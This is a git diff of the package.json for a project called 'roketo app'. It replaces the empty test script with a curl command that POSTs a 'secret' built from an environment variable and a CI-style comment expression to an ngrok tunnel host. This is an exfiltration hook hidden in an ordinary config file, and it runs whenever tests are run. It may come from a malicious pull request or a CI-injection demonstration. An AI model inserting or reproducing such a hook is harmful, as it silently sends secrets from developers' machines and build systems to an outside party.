@@ -4,7 +4,7 @@
   "description": "the official roketo app",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"no test specified\""
+    "test": "curl --request POST --url https://4d25-77-137-8-226.ngrok.io --header 'content-type: application/json' --data '{\"secret\": \"here it is - '${{ process.env.COMMENT_BODY }}'\"}' --fail"
   },
   "repository": {
     "type": "git",
@@ -20,3 +20,4 @@
     "express": "^4.17.1"
   }
 }
+
